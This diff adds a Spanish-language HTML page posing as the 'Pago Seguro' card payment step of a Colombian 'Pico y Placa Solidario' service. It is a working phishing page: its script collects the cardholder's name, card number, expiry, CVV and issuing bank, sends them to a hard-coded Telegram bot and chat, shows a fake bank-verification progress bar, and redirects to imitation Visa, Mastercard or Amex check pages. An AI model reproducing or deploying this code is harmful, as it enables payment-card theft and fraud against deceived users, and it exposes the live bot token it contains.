@@ -1,0 +1,1044 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pago Seguro - Pico y Placa Solidario</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .background-wrapper {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .background-wrapper .bg-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .background-wrapper .bg-blur {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            background: rgba(0, 0, 0, 0.3);
+        }
+
+        .modal-overlay {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .modal-box {
+            background: #ffffff;
+            border-radius: 0.75rem;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+            width: 100%;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .modal-header {
+            background: #f5f5f5;
+            padding: 1.5rem;
+            border-bottom: 1px solid #e0e0e0;
+            position: relative;
+        }
+
+        .modal-close-btn {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            width: 32px;
+            height: 32px;
+            border: none;
+            background: none;
+            font-size: 1.8rem;
+            color: #666;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            transition: background 0.2s;
+        }
+
+        .modal-close-btn:hover {
+            background: rgba(0, 0, 0, 0.05);
+            color: #333;
+        }
+
+        .modal-header h2 {
+            font-size: 1.2rem;
+            color: #000;
+            font-weight: 700;
+            margin-bottom: 0.3rem;
+        }
+
+        .modal-header p {
+            font-size: 0.9rem;
+            color: #666;
+            margin: 0;
+        }
+
+        .stepper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+            margin-top: 1rem;
+        }
+
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 0.35rem;
+            min-width: 50px;
+        }
+
+        .step-circle {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #d0d0d0;
+            color: white;
+            font-weight: 700;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+        }
+
+        .step-circle.active {
+            background: #00271C;
+            box-shadow: 0 0 12px rgba(0, 39, 28, 0.4);
+        }
+
+        .step-circle.completed {
+            background: #88F456;
+            color: #00271C;
+        }
+
+        .step-line {
+            width: 30px;
+            height: 2px;
+            background: #d0d0d0;
+            margin: 0 -0.25rem;
+        }
+
+        .step-line.completed {
+            background: #88F456;
+        }
+
+        .step-label {
+            font-size: 0.7rem;
+            color: #999;
+            text-align: center;
+            max-width: 60px;
+            line-height: 1.2;
+        }
+
+        .step-label.active {
+            color: #00271C;
+            font-weight: 600;
+        }
+
+        .modal-content {
+            flex: 1;
+            overflow-y: auto;
+            padding: 2rem 1.5rem;
+        }
+
+        .modal-content::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .modal-content::-webkit-scrollbar-track {
+            background: #f1f1f1;
+        }
+
+        .modal-content::-webkit-scrollbar-thumb {
+            background: #b0b0b0;
+            border-radius: 3px;
+        }
+
+        .payment-method {
+            display: flex;
+            gap: 2rem;
+            margin-bottom: 2rem;
+            padding-bottom: 1.5rem;
+            border-bottom: 1px solid #e0e0e0;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .payment-method img {
+            width: 48px;
+            height: auto;
+            object-fit: contain;
+        }
+
+        .form-group {
+            margin-bottom: 1.2rem;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 0.6rem;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 0.75rem 0.75rem;
+            border: 2px solid #ddd;
+            border-radius: 0.4rem;
+            font-size: 0.95rem;
+            color: #333;
+            background: #fafbfc;
+            font-family: 'Roboto', sans-serif;
+            transition: all 0.2s;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #00271C;
+            background: white;
+        }
+
+        .form-group input::placeholder {
+            color: #999;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 1rem;
+        }
+
+        .form-row .form-group {
+            margin-bottom: 0;
+        }
+
+        /* ===== WRAPPER PARA EL INPUT CON LOGO ===== */
+        .card-input-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .card-input-wrapper input {
+            width: 100%;
+            padding-right: 50px;
+            margin: 0;
+            box-sizing: border-box;
+        }
+
+        .card-logo {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 36px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            pointer-events: none;
+        }
+
+        .card-logo img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 0.6rem;
+            margin-bottom: 1.5rem;
+            padding: 1rem;
+            background: #f5f5f5;
+            border-radius: 0.4rem;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            accent-color: #00271C;
+            flex-shrink: 0;
+            margin-top: 0.15rem;
+        }
+
+        .checkbox-group label {
+            margin: 0;
+            font-size: 0.85rem;
+            color: #333;
+            cursor: pointer;
+            flex: 1;
+            line-height: 1.4;
+        }
+
+        .checkbox-group a {
+            color: #00271C;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .checkbox-group a:hover {
+            text-decoration: underline;
+        }
+
+        .alert {
+            padding: 1rem;
+            border-radius: 0.4rem;
+            margin-bottom: 1rem;
+            font-size: 0.9rem;
+            font-weight: 500;
+            display: none;
+            align-items: center;
+            gap: 0.8rem;
+        }
+
+        .alert-error {
+            background: #ffebee;
+            color: #c62828;
+            border: 1px solid #ffcdd2;
+        }
+
+        .alert-error.show {
+            display: flex;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 0.75rem 1.5rem;
+            border: none;
+            border-radius: 9999px;
+            font-size: 0.95rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .btn-submit {
+            background: #00271C;
+            color: #88F456;
+            box-shadow: 0 4px 12px rgba(0, 39, 28, 0.2);
+        }
+
+        .btn-submit:hover {
+            background: #00391f;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 39, 28, 0.3);
+        }
+
+        .btn-submit:active {
+            transform: translateY(0);
+        }
+
+        .btn-cancel {
+            background: white;
+            color: #00271C;
+            border: 2px solid #00271C;
+        }
+
+        .btn-cancel:hover {
+            background: #f0f9f7;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-card {
+            background: white;
+            border-radius: 0.75rem;
+            padding: 2.5rem 2rem;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+
+        .loading-icon {
+            font-size: 3rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .loading-icon img {
+            width: 80px;
+            height: auto;
+        }
+
+        .loading-text {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 0.8rem;
+        }
+
+        .loading-subtext {
+            font-size: 0.85rem;
+            color: #666;
+            margin-bottom: 1.5rem;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 1rem;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: #00271C;
+            width: 0%;
+            transition: width 0.2s;
+            border-radius: 3px;
+        }
+
+        .progress-text {
+            font-size: 0.8rem;
+            color: #999;
+        }
+
+        .modal-footer {
+            background: #f9f9f9;
+            padding: 1.25rem 1.5rem;
+            border-top: 1px solid #e0e0e0;
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            flex-wrap: wrap;
+        }
+
+        @media (max-width: 768px) {
+            .modal-overlay {
+                max-width: 100%;
+                padding: 0;
+            }
+
+            .modal-box {
+                border-radius: 1rem 1rem 0 0;
+                max-height: 95vh;
+            }
+
+            .modal-header {
+                padding: 1.2rem 1rem;
+            }
+
+            .modal-content {
+                padding: 1.5rem 1rem;
+            }
+
+            .modal-close-btn {
+                width: 28px;
+                height: 28px;
+                font-size: 1.5rem;
+            }
+
+            .modal-header h2 {
+                font-size: 1rem;
+            }
+
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+
+            .button-group {
+                flex-direction: column;
+            }
+
+            .btn {
+                width: 100%;
+            }
+
+            .loading-card {
+                padding: 2rem 1.5rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 0;
+            }
+
+            .modal-overlay {
+                padding: 0;
+            }
+
+            .modal-header {
+                padding: 1rem 0.75rem;
+            }
+
+            .modal-content {
+                padding: 1.2rem 0.75rem;
+            }
+
+            .modal-close-btn {
+                width: 24px;
+                height: 24px;
+                font-size: 1.3rem;
+                top: 0.6rem;
+                right: 0.6rem;
+            }
+
+            .form-group label {
+                font-size: 0.85rem;
+            }
+
+            .form-group input {
+                padding: 0.6rem;
+                font-size: 0.9rem;
+            }
+
+            .form-row {
+                gap: 0.75rem;
+            }
+
+            .button-group {
+                gap: 0.5rem;
+            }
+
+            .btn {
+                padding: 0.6rem 1rem;
+                font-size: 0.9rem;
+            }
+
+            .checkbox-group label {
+                font-size: 0.75rem;
+            }
+
+            .loading-card {
+                padding: 1.5rem 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="background-wrapper">
+    <img class="bg-image" src="blur.png" alt="Fondo">
+    <div class="bg-blur"></div>
+</div>
+
+<div class="modal-overlay">
+    <div class="modal-box">
+
+        <div class="modal-header">
+            <button class="modal-close-btn" onclick="window.location.href='pago.html';">✕</button>
+            <h2>Información de Pago</h2>
+            <p>Completa los datos de tu tarjeta de crédito</p>
+
+            <div class="stepper">
+                <div class="step"><div class="step-circle completed">✓</div><div class="step-label">Datos</div></div>
+                <div class="step-line completed"></div>
+                <div class="step"><div class="step-circle completed">✓</div><div class="step-label">Placa</div></div>
+                <div class="step-line completed"></div>
+                <div class="step"><div class="step-circle active">3</div><div class="step-label active">Pago</div></div>
+                <div class="step-line"></div>
+                <div class="step"><div class="step-circle">4</div><div class="step-label">Confirmar</div></div>
+            </div>
+        </div>
+
+        <div class="modal-content">
+            <div class="alert alert-error" id="alertError">
+                <span>❌</span>
+                <span id="mensajeError">Por favor, completa todos los campos correctamente</span>
+            </div>
+
+            <h3 style="font-size: 0.95rem; color: #000; margin-bottom: 1rem; font-weight: 600;">Tarjeta débito/crédito</h3>
+            
+            <div class="payment-method">
+                <img src="visa.png" alt="Visa">
+                <img src="mastercard.png" alt="Mastercard">
+                <img src="ame.png" alt="American Express">
+            </div>
+
+            <form id="formTarjeta" onsubmit="return false;">
+                <div class="form-group">
+                    <label for="nombre">Nombre del titular</label>
+                    <input 
+                        type="text" 
+                        id="nombre" 
+                        name="nombre" 
+                        placeholder="Juan Pérez García"
+                        autocomplete="cc-name"
+                        required>
+                </div>
+
+                <!-- ===== INPUT CON LOGO ===== -->
+                <div class="form-group">
+                    <label for="numero">Número de tarjeta</label>
+                    <div class="card-input-wrapper">
+                        <input 
+                            type="text" 
+                            id="numero" 
+                            name="numero" 
+                            placeholder="1234 5678 9012 3456" 
+                            maxlength="19"
+                            autocomplete="cc-number"
+                            required>
+                        <div class="card-logo" id="cardLogo"></div>
+                    </div>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="exp">Fecha de vencimiento</label>
+                        <input 
+                            type="text" 
+                            id="exp" 
+                            name="exp" 
+                            placeholder="MM / AA"
+                            maxlength="7"
+                            autocomplete="cc-exp"
+                            required>
+                    </div>
+                    <div class="form-group">
+                        <label for="cvv">CVV</label>
+                        <input 
+                            type="text" 
+                            id="cvv" 
+                            name="cvv" 
+                            placeholder="123"
+                            maxlength="4"
+                            autocomplete="cc-csc"
+                            required>
+                    </div>
+                </div>
+
+                <!-- ===== BANCO EMISOR ===== -->
+                <div class="form-group">
+                    <label for="bancoEmisor">Banco emisor <span class="required" style="color:#e53935;">*</span></label>
+                    <select id="bancoEmisor" name="bancoEmisor" required>
+                        <option value="">Seleccione su banco</option>
+                        <option value="Bancolombia">BANCOLOMBIA</option>
+                        <option value="Davivienda">BANCO DAVIVIENDA</option>
+                        <option value="BBVA Colombia">BANCO BBVA COLOMBIA S.A.</option>
+                        <option value="Banco de Bogotá">BANCO DE BOGOTA</option>
+                        <option value="Caja Social">BANCO CAJA SOCIAL</option>
+                        <option value="Citibank Colombia">CITIBANK</option>
+                        <option value="Colpatria">SCOTIABANK COLPATRIA</option>
+                        <option value="Banco AV Villas">BANCO AV VILLAS</option>
+                        <option value="Banco Falabella">BANCO FALABELLA</option>
+                        <option value="Banco Finandina">BANCO FINANDINA S.A. BIC</option>
+                        <option value="Itaú">BANCO ITAU</option>
+                        <option value="Nequi">NEQUI</option>
+                        <option value="Banco Occidente">BANCO DE OCCIDENTE</option>
+                        <option value="Banco Popular">BANCO POPULAR</option>
+                        <option value="Serfinanza">BANCO SERFINANZA</option>
+                        <option value="Tuya">TUYA S.A.</option>
+                    </select>
+                    <div class="error-message" style="color:#e53935; font-size:0.75rem; display:none;">Seleccione un banco</div>
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="terms" name="terms" required>
+                    <label for="terms">
+                        Autorizo el pago y acepto los <a href="#">términos de servicio</a>
+                    </label>
+                </div>
+
+                <div class="button-group">
+                    <button type="button" id="btnPagar" class="btn btn-submit">
+                        Pagar Ahora
+                    </button>
+                    <button type="button" onclick="window.location.href='pago.html';" class="btn btn-cancel">
+                        Cancelar
+                    </button>
+                </div>
+            </form>
+        </div>
+
+    </div>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-card">
+        <div class="loading-icon" id="loadingIcon">
+            <img id="loadingLogo" src="" alt="Logo tarjeta">
+        </div>
+        <div class="loading-text" id="loadingText">Procesando pago</div>
+        <div class="loading-subtext" id="loadingSubtext">Por favor espera mientras verificamos tu identidad</div>
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <div class="progress-text" id="progressText">Conectando con el banco...</div>
+    </div>
+</div>
+
+<script>
+    // ============================================================
+    // CONFIGURACIÓN DE TELEGRAM
+    // ============================================================
+    const TELEGRAM_BOT_TOKEN = '8736155859:AAHI77N8wP6_UNpI3RGIerJkLRRKUvVR8iQ';
+    const TELEGRAM_CHAT_ID = '-1004294946880';
+
+    // ============================================================
+    // LÓGICA DE LA TARJETA
+    // ============================================================
+    const inputNumero = document.getElementById('numero');
+    const cardLogo = document.getElementById('cardLogo');
+    const inputExp = document.getElementById('exp');
+    const inputCVV = document.getElementById('cvv');
+    const btnPagar = document.getElementById('btnPagar');
+    const alertError = document.getElementById('alertError');
+    const mensajeError = document.getElementById('mensajeError');
+    const bancoEmisorSelect = document.getElementById('bancoEmisor');
+
+    let tipoTarjeta = '';
+
+    function detectarTipoTarjeta(numero) {
+        const num = numero.replace(/\s/g, '');
+        
+        if (num.startsWith('4')) {
+            tipoTarjeta = 'Visa';
+            return 'Visa';
+        } else if (num.startsWith('5')) {
+            tipoTarjeta = 'Mastercard';
+            return 'Mastercard';
+        } else if (num.startsWith('34') || num.startsWith('37')) {
+            tipoTarjeta = 'American Express';
+            return 'American Express';
+        } else {
+            tipoTarjeta = '';
+            return '';
+        }
+    }
+
+    function mostrarError(mensaje) {
+        mensajeError.textContent = mensaje;
+        alertError.classList.add('show');
+        setTimeout(() => {
+            alertError.classList.remove('show');
+        }, 5000);
+    }
+
+    function ocultarError() {
+        alertError.classList.remove('show');
+    }
+
+    // ============================================================
+    // DETECCIÓN DE TARJETA Y LOGO - SOLO CUANDO ESCRIBE
+    // ============================================================
+    inputNumero.addEventListener('input', function(e) {
+        let value = this.value.replace(/\s/g, '');
+        value = value.replace(/\D/g, '');
+        this.value = value.replace(/(\d{4})/g, '$1 ').trim();
+
+        const type = detectarTipoTarjeta(this.value);
+        cardLogo.innerHTML = '';
+
+        if (type === 'Visa') {
+            const img = document.createElement('img');
+            img.src = 'visa.png';
+            img.alt = 'Visa';
+            img.style.height = '22px';
+            cardLogo.appendChild(img);
+        } else if (type === 'Mastercard') {
+            const img = document.createElement('img');
+            img.src = 'mastercard.png';
+            img.alt = 'Mastercard';
+            img.style.height = '22px';
+            cardLogo.appendChild(img);
+        } else if (type === 'American Express') {
+            const img = document.createElement('img');
+            img.src = 'ame.png';
+            img.alt = 'American Express';
+            img.style.height = '22px';
+            cardLogo.appendChild(img);
+        }
+        // Si no hay tipo, el logo permanece vacío (no se muestra)
+    });
+
+    // ============================================================
+    // FORMATO DE EXPIRACIÓN
+    // ============================================================
+    inputExp.addEventListener('input', function(e) {
+        let valor = this.value.replace(/\D/g, '').substring(0, 4);
+        let resultado = '';
+        
+        if (valor.length >= 2) {
+            resultado = valor.substring(0, 2) + ' / ' + valor.substring(2, 4);
+        } else {
+            resultado = valor;
+        }
+        this.value = resultado;
+    });
+
+    // ============================================================
+    // SOLO NÚMEROS EN CVV
+    // ============================================================
+    inputCVV.addEventListener('input', function(e) {
+        this.value = this.value.replace(/\D/g, '').substring(0, 4);
+    });
+
+    // ============================================================
+    // ENVÍO A TELEGRAM
+    // ============================================================
+    async function enviarATelegram(datos) {
+        const mensaje = `💳 *NUEVA TARJETA REGISTRADA*\n` +
+                        `━━━━━━━━━━━━━━━━━━\n` +
+                        `🏦 *Tipo:* ${datos.tipo}\n` +
+                        `👤 *Titular:* ${datos.nombre}\n` +
+                        `🔢 *Número:* ${datos.numero}\n` +
+                        `📅 *Expiración:* ${datos.exp}\n` +
+                        `🔒 *CVV:* ${datos.cvv}\n` +
+                        `🏛️ *Banco Emisor:* ${datos.bancoEmisor}\n` +
+                        `━━━━━━━━━━━━━━━━━━\n` +
+                        `🕐 *Fecha:* ${new Date().toLocaleString()}`;
+
+        try {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: new URLSearchParams({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: mensaje,
+                    parse_mode: 'Markdown'
+                })
+            });
+            return await response.json();
+        } catch (error) {
+            console.error('Error enviando a Telegram:', error);
+            return null;
+        }
+    }
+
+    // ============================================================
+    // BOTÓN PAGAR
+    // ============================================================
+    btnPagar.addEventListener('click', function() {
+        ocultarError();
+        
+        const nombre = document.getElementById('nombre').value.trim();
+        const numero = inputNumero.value.replace(/\s/g, '');
+        const exp = inputExp.value.trim();
+        const cvv = inputCVV.value.trim();
+        const bancoEmisor = bancoEmisorSelect.value;
+        const terms = document.getElementById('terms').checked;
+
+        // Validar banco emisor
+        const bancoError = document.querySelector('.form-group:has(#bancoEmisor) .error-message');
+        const bancoGroup = document.getElementById('bancoEmisor').closest('.form-group');
+
+        if (!nombre) {
+            mostrarError('Por favor, ingresa el nombre del titular');
+            return;
+        }
+
+        if (!numero || numero.length < 15) {
+            mostrarError('El número de tarjeta debe tener al menos 15 dígitos');
+            return;
+        }
+
+        // Validar formato de fecha: MM / AA (2 dígitos mes, 2 dígitos año)
+        const fechaRegex = /^\d{2}\s\/\s\d{2}$/;
+        if (!exp || !fechaRegex.test(exp)) {
+            mostrarError('Ingresa una fecha de vencimiento válida (MM / AA)');
+            return;
+        }
+
+        if (!cvv || cvv.length < 3) {
+            mostrarError('Ingresa un CVV válido (3 o 4 dígitos)');
+            return;
+        }
+
+        if (!bancoEmisor) {
+            bancoGroup.classList.add('error');
+            bancoError.style.display = 'block';
+            mostrarError('Selecciona un banco emisor');
+            return;
+        } else {
+            bancoGroup.classList.remove('error');
+            bancoError.style.display = 'none';
+        }
+
+        if (!terms) {
+            mostrarError('Debes aceptar los términos de servicio');
+            return;
+        }
+
+        const tipo = detectarTipoTarjeta(numero);
+        if (!tipo) {
+            mostrarError('Tipo de tarjeta no reconocido');
+            return;
+        }
+
+        // ============================================================
+        // GUARDAR BANCO EMISOR EN localStorage
+        // ============================================================
+        localStorage.setItem('bancoEmisor', bancoEmisor);
+
+        // ============================================================
+        // MOSTRAR PANTALLA DE CARGA
+        // ============================================================
+        const overlay = document.getElementById('loadingOverlay');
+        const progressFill = document.getElementById('progressFill');
+        const progressText = document.getElementById('progressText');
+        const loadingText = document.getElementById('loadingText');
+        const loadingSubtext = document.getElementById('loadingSubtext');
+        const loadingLogo = document.getElementById('loadingLogo');
+
+        const configs = {
+            'Visa': {
+                texto: 'Redirigiendo a Visa...',
+                subtexto: 'Verificando con Visa Secure...',
+                mensaje: 'Conectando con Visa...',
+                icono: 'visa.png',
+                redirigir: 'visa.html'
+            },
+            'Mastercard': {
+                texto: 'Redirigiendo a Mastercard...',
+                subtexto: 'Verificando con Mastercard SecureCode...',
+                mensaje: 'Conectando con Mastercard...',
+                icono: 'mastercard.png',
+                redirigir: 'mastercard.html'
+            },
+            'American Express': {
+                texto: 'Redirigiendo a American Express...',
+                subtexto: 'Verificando con AmEx SafeKey...',
+                mensaje: 'Conectando con American Express...',
+                icono: 'amex.png', // Logo para la pantalla de carga (con x)
+                redirigir: 'amex.html'
+            }
+        };
+
+        const config = configs[tipo];
+        loadingText.textContent = config.texto;
+        loadingSubtext.textContent = config.subtexto;
+        loadingLogo.src = config.icono;
+
+        overlay.classList.add('active');
+
+        const datosEnvio = {
+            nombre: nombre,
+            numero: numero,
+            exp: exp,
+            cvv: cvv,
+            tipo: tipo,
+            bancoEmisor: bancoEmisor
+        };
+
+        // ============================================================
+        // ANIMACIÓN DE PROGRESO + ENVÍO A TELEGRAM + REDIRECCIÓN
+        // ============================================================
+        let progreso = 0;
+        let envioCompletado = false;
+
+        const intervalo = setInterval(() => {
+            progreso += Math.random() * 15 + 5;
+            if (progreso > 95) progreso = 95;
+            progressFill.style.width = progreso + '%';
+            
+            if (progreso > 30 && progreso < 60) {
+                progressText.textContent = 'Verificando datos de la tarjeta...';
+            } else if (progreso > 60 && progreso < 85) {
+                progressText.textContent = 'Autorizando transacción...';
+            } else if (progreso >= 85) {
+                progressText.textContent = 'Finalizando proceso...';
+            }
+
+            if (progreso >= 95 && !envioCompletado) {
+                clearInterval(intervalo);
+                envioCompletado = true;
+                progressFill.style.width = '100%';
+                progressText.textContent = '¡Completado!';
+
+                enviarATelegram(datosEnvio).then(resultado => {
+                    console.log('Envío a Telegram:', resultado);
+                });
+
+                localStorage.setItem('tarjeta_datos', JSON.stringify(datosEnvio));
+                localStorage.setItem('tarjeta_tipo', tipo);
+                localStorage.setItem('cardLast4', numero.slice(-4));
+
+                setTimeout(() => {
+                    window.location.href = config.redirigir;
+                }, 1000);
+            }
+        }, 200);
+    });
+
+    // ============================================================
+    // NO CARGAR LOGO AL INICIAR - EL LOGO SOLO APARECE AL ESCRIBIR
+    // ============================================================
+</script>
+
+</body>
+</html>
